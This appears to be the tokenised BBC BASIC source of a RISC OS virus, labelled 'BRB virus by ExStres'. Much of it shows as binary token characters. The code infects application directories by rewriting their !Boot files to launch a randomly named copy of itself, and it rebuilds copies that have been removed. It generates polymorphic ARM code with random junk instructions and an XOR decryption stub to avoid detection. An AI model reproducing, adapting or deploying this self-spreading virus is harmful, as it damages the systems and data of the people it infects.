 � BRB� virus by ExStres (� Source code 2&� DO NOT DISTRIBUTE....(or run :-) <0� � report$=�$ + " at line " + Þ:�0,report$ Fc%=� P
r%=�-� Z: d� code r%+4096 n� inf$(100,2) x� inf%(100) �infcnt%=-1 �infects%=-1 �� code% 2048 ��assemble �: �5�OSCLI "Save moo &"+STR$~code+"+&"+STR$~(p%-code) �6�OSCLI "Save moo &"+STR$~codebase+"+&"+STR$~(r%-1) �: �� b% 16384 �q%=� �5ș "Wimp_Initialise",200,&4B534154,�getname � ,t% �: �polls%=0	� � :countit%=0ȕ � q%"+� countit%=4 � countit%=0:�checkinfects,countit%+=16&ș "Wimp_Poll",,b% � reason%,info%@X� reason%=17 � reason%=18 � � b%!16=5 � f$=�getstring(b%+44):unk%=�:y%=b%!40:�infectJ�T$ș "Wimp_CloseDown",t%,&4B534154^:h�r:|��checkinfects�� infects%>-1 ��  � iij=0 � infects%�)    file$=inf$(iij,0)+"."+inf$(iij,1)�    leng%=inf%(iij)�%    ș "XOS_File",5,file$ � type%�$    �PRINT file$+" : "+STR$type%�    � type%=0 ��;      � OH FLIBBLE ONE OF OUR VIRUSES HAS BEEN REMOVED!�.      � we better rebuilt it hadn't we :))�      f$=inf$(iij,0)�      nmy$=inf$(iij,1)      unk%=�	      y%=&2000      �infect	    �&  �0�:�D:N/ݤgetstring(a%):s$="":ȕ (?a%<>13)�(?a%<>0)Xs$+=�(?a%):a%+=1:�:=s$b:lݤremdots(nm$)vȕ �nm$,".")>0�nm$=�nm$,�nm$,".")+1)���=nm$�:���infect�'� y%=&2000 � ��remdots(f$),1)="!" ��'   ș "XOS_File",5,f$+".!Boot" � y%�   � y%=1 ��      f%=�(f$+".!Boot")�      ȕ � �#f%�      t$=�#f%�0      �IF t$="|hacked" THEN CLOSE#f%:ENDPROC      �   �$      � y%=0 � f%=�(f$+".!Boot")    �*   � y%=0 � y%=1 �4      � unk%=� �>(        nmy$=ó(100)+ó(100)+ó(100)H        �R        nmy$=�getname\-        ș "XOS_File",5,f$+"."+nmy$ � yv%f        � yv%=0p      �z      �#f%,""�      �BPUT#f%,"|hacked"�      slot%=64+�(36)�$      slot$=�(slot%+(slot% � 3))�9      �#f%,"WimpSlot -min "+slot$+"k -max "+slot$+"k"�+      �#f%,"Filer_Run <obey$dir>."+nmy$�      �#f%�'      � "Settype "+f$+".!Boot Obey"�<      � "Save "+f$+"."+nmy$+" &"+�~code+"+&"+�~(p%-code)�      � unk%=� ��.        ș "OS_File",5,f$+"."+nmy$ � type%�        � type%=1 ��)          � infects%<99 � infects%+=1�          infcnt%+=1'          � infcnt%=100 � infcnt%=0           inf$(infcnt%,0)=f$"          inf$(infcnt%,1)=nmy$$        �.      �87      �SYS "XOS_File",10,f$+"."+nmy$,&FFB,,c%,c%+r%B      �assembleL   �V�`�j:t
ݤnoop~nn=�(10)�� nn<4 � =0�� i=3 � nn�reg%=�(10)�Ȏ �(18) ��  � 2 : [opt pass�!              moveq reg%,reg%�           ]�  � 3 : [opt pass�&              andeq reg%,reg%,reg%�           ]�  � 4 : [opt pass�&              andne reg%,reg%,reg%            ]
  � 5 : [opt pass&              andgt reg%,reg%,reg%           ](  � 6 : [opt pass2&              andlt reg%,reg%,reg%<           ]F  � 7 : [opt passP&              andal reg%,reg%,reg%Z           ]d  � 8 : [opt passn$              and reg%,reg%,reg%x           ]�  � 9 : [opt pass�!              movne reg%,reg%�           ]� � 10 : [opt pass�!              movgt reg%,reg%�           ]� � 11 : [opt pass�!              movlt reg%,reg%�           ]� � 12 : [opt pass�              mov reg%,reg%�           ]� � 13 : [opt pass!              movne reg%,reg%           ] � 14 : [opt pass"!              movcc reg%,reg%,           ]6 � 15 : [opt pass@!              movcs reg%,reg%J           ]T � 16 : [opt pass^!              movnv reg%,reg%h           ]r�|��=0�:�ݤgetname�� z$:z$=""�� i=0 � �(5)+5�num%=�(50)+64�� num%>90 � num%+=7�z$+=�(num%)���=�z$,10)�:���assemble�enc%=�(255)aa=�� pass=0 � 2 � 2P%=code&�PROCnoop0bb=�(-aa):select%=(�(255) � 3)DȎ select% �N&     � First unecryption algorithmX     � 0 :  [opt passb                  �noopl%                  adr r0,codebasev                  �noop�                  mov r1,#0�                  �noop�"                  ldr r4,mooit�                  �noop�"                  mov r5,#enc%�                  �noop�%              .go ldrb r3,[r0,r1]�                  �noop�"                  eor r3,r3,r5�                  �noop�%                  strb r3,[r0,r1]�                  �noop�"                  add r1,r1,#1                  �noop                  cmp r1,r4                  �noop                   blt go*#              .start adr r0,str4                     �noop>%                     swi "OS_CLI"H                     �noopR&                     swi "OS_Exit"\D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt passf%              .str equd �(255) ;0p%                   equd �(255) ;4z%                   equd �(255) ;8�&                   equd �(255) ;16�&                   equd �(255) ;20�&                   equd �(255) ;24�&                   equd �(255) ;28�&                   equd �(255) ;32�&                   equd �(255) ;36�&                   equd �(255) ;48�&                   equd �(255) ;52�*              ]:� i=0 � �(6):[opt pass�"                   equd �(255)�              ]:�:[opt pass�              .mooit equd 0�*              ]:� i=0 � �(6):[opt pass	"                   equd �(255)	              ]:�:[opt pass	              ]	$     � 1 :  [opt pass	.                  �noop	8                  b encryp	BD              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass	L%              .str equd �(255) ;0	V%                   equd �(255) ;4	`%                   equd �(255) ;8	j&                   equd �(255) ;16	t&                   equd �(255) ;20	~&                   equd �(255) ;24	�&                   equd �(255) ;28	�&                   equd �(255) ;32	�&                   equd �(255) ;36	�&                   equd �(255) ;48	�&                   equd �(255) ;52	�D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass	�              .encryp	�                  �noop	�%                  adr r0,codebase	�                  �noop	�                  mov r1,#0	�                  �noop
 !                  adr r12,str

                  �noop
"                  ldr r4,mooit
                  �noop
("                  mov r5,#enc%
2                  �noop
<                  b go
F                  �noop
PD              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass
Z              .mooit equd 0
dD              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass
n                  �noop
xD              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass
�%              .go ldrb r3,[r0,r1]
�                  �noop
�"                  eor r3,r3,r5
�                  �noop
�%                  strb r3,[r0,r1]
�                  �noop
�"                  add r1,r1,#1
�                  �noop
�                  cmp r1,r4
�                  �noop
�                  blt go
�                  �noop
�#              .start mov r0,r12                  �noop%                     swi "OS_CLI"                  �noop"&                     swi "OS_Exit",D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass6              ]@     � 2:  [opt passJ                  �noopT                  b encryp^                  �noophD              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt passr              .encryp|%                  adr r0,codebase�                  �noop�                  mov r1,#0�                  �noop�                  b codeit�D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass�                  �noop�%              .str equd �(255) ;0�%                   equd �(255) ;4�%                   equd �(255) ;8�&                   equd �(255) ;16�&                   equd �(255) ;20�&                   equd �(255) ;24�&                   equd �(255) ;28&                   equd �(255) ;32&                   equd �(255) ;36&                   equd �(255) ;48&&                   equd �(255) ;520                  �noop:D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt passD                  �noopN              .mooit equd 0X                  �noopbD              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt passl                  �noopv'              .ency strb r3,[r0,r1]�                  �noop�"                  add r1,r1,#1�                  �noop�                  cmp r1,r4�                  �noop�                  blt go�                  �noop�                  b start�                  �noop�D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass�                  �noop�%              .codeit adr r12,str�                  �noop"                  ldr r4,mooit                  �noop"                  mov r5,#enc%                   �noop*                  b go4                  �noop>D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt passH                  �noopR%              .go ldrb r3,[r0,r1]\                  �noopf"                  eor r3,r3,r5p                  �noopz                  b ency�                  �noop�D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass�                  �noop�#              .start mov r0,r12�                  �noop�%                     swi "OS_CLI"�                  �noop�&                     swi "OS_Exit"�                  �noop�D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass�                  �noop�              ]�     � 3:  [opt pass                  �noop                  b encryp                  �noop$D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass.                  �noop8              .encrypB                  �noopL%                  adr r0,codebaseV                  �noop`                  mov r1,#0j                  �noopt                  b codeit~                  �noop�D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass�                  �noop�$              .goto add r1,r1,#1�                  �noop�                  cmp r1,r4�                  �noop�                  b ret�                  �noop�D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass�                  �noop�%              .str equd �(255) ;0�%                   equd �(255) ;4 %                   equd �(255) ;8
&                   equd �(255) ;16&                   equd �(255) ;20&                   equd �(255) ;24(&                   equd �(255) ;282&                   equd �(255) ;32<&                   equd �(255) ;36F&                   equd �(255) ;48P&                   equd �(255) ;52Z                  �noopdD              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt passn                  �noopx              .mooit equd 0�                  �noop�D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass�                  �noop�'              .ency strb r3,[r0,r1]�                  �noop�                  b goto�                  �noop�              .ret blt go�                  �noop�                  b start�                  �noop�D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass�                  �noop%              .codeit adr r12,str                  �noop"                  ldr r4,mooit"                  �noop,"                  mov r5,#enc%6                  �noop@                  b goJ                  �noopTD              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass^                  �nooph%              .go ldrb r3,[r0,r1]r                  �noop|"                  eor r3,r3,r5�                  �noop�                  b ency�                  �noop�D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass�                  �noop�#              .start mov r0,r12�                  �noop�%                     swi "OS_CLI"�                  �noop�&                     swi "OS_Exit"�                  �noop�D              ]:� i=0 � �(6):[opt pass:equd �(255):]:�:[opt pass�                  �noop              ]�[opt pass&.codebase0]:
P%+=r%D�i=0 � �(100)N[opt passX  equb �(255)b]l�v��!mooit=r%�	p%=P%��PRINT r%+1024��PRINT P%-code�:�� pass=0 � 2 � 2�P%=code%�[opt pass�    ; r0 = base�    ; r1 = size�    ; r2 = target�    ; r4 = 0�    ; r5 = enccode.go ldrb r3,[r0,r4]    eor r3,r3,r5    strb r3,[r2,r4]     add r4,r4,#1*    cmp r4,r14    blt go>    mov pc,r14H]R�\-A%=c%:B%=r%:C%=codebase:E%=0:F%=enc%:� gofcb%=codebasepct%=codebase+r%z'cb$=�~cb%:ȕ �(cb$)<8:cb$="0"+cb$:��'ct$=�~ct%:ȕ �(ct$)<8:ct$="0"+ct$:��$$str="BASIC -quit @"+cb$+","+ct$���:�